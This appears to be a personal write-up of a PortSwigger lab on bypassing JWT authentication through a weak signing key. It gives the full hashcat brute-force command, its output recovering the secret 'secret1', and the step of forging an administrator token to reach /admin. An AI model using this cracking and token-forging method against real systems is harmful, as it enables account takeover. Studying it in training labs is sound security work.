# [JWT authentication bypass via weak signing key] — [PortSwigger] — [Practitioner]
**Date:** 2026-07-08
 
---
 
## Vulnerability / core concept
JWT

---


## Payload / key command
This web application uses JWT tokens to handle users' session, authentication, authorization, etc. When we decode the JWT token we see the following:
```bash
{
  "iss": "portswigger",
  "exp": 1783540014,
  "sub": "wiener"
}
```
When we are inspecting the JWT token itself, we can notice that the lenght of the signature is very short. This suggested that secret might be weak. Therefore, after obtaining a wordlist of most common JWT signatures, we use `hashcat` to brute-force our JWT token and see if we can find the secret.
```bash
➜  Desktop hashcat -a 0 -m 16500 eyJraWQiOiJjNjdmZTA0Mi1lZWNkLTQ1NWQtYTExMS01OTY4YjA5MjM1MDkiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4MzU0MTY2Nywic3ViIjoid2llbmVyIn0.fxRIc5NIhNLirdVbbLjdAE1z-J6ia8bHIzx4o60C1FM ~/Desktop/wordlist.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 7.1  Linux, Release, RELOC, LLVM 20.1.8, SLEEF, DISTRO, CUDA, POCL_DEBUG) - Platform #1 [The pocl project]
======================================================================================================================================
* Device #01: cpu-haswell-13th Gen Intel(R) Core(TM) i5-1345U, 1465/2930 MB (1465 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (2382 MB free)

Dictionary cache built:
* Filename..: /home/blackarch/Desktop/wordlist.txt
* Passwords.: 103979
* Bytes.....: 1127778
* Keyspace..: 103965
* Runtime...: 0 secs

eyJraWQiOiJjNjdmZTA0Mi1lZWNkLTQ1NWQtYTExMS01OTY4YjA5MjM1MDkiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4MzU0MTY2Nywic3ViIjoid2llbmVyIn0.fxRIc5NIhNLirdVbbLjdAE1z-J6ia8bHIzx4o60C1FM:secret1
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 16500 (JWT (JSON Web Token))
Hash.Target......: eyJraWQiOiJjNjdmZTA0Mi1lZWNkLTQ1NWQtYTExMS01OTY4YjA...60C1FM
Time.Started.....: Wed Jul  8 23:17:38 2026 (0 secs)
Time.Estimated...: Wed Jul  8 23:17:38 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/home/blackarch/Desktop/wordlist.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:    54407 H/s (1.73ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4096/103965 (3.94%)
Rejected.........: 0/4096 (0.00%)
Restore.Point....: 0/103965 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...:  -> 5211314
Hardware.Mon.#01.: Util:  8%

Started: Wed Jul  8 23:17:19 2026
Stopped: Wed Jul  8 23:17:39 2026

```
As you can see, after brute-forcing the JWT token, we found out that the secret is `secret1`. Now, we can create valid JWT token for administrator and access his account.

  Using this JWT token we can visit `/admin` page and delete user `carlos` to solve this lab.


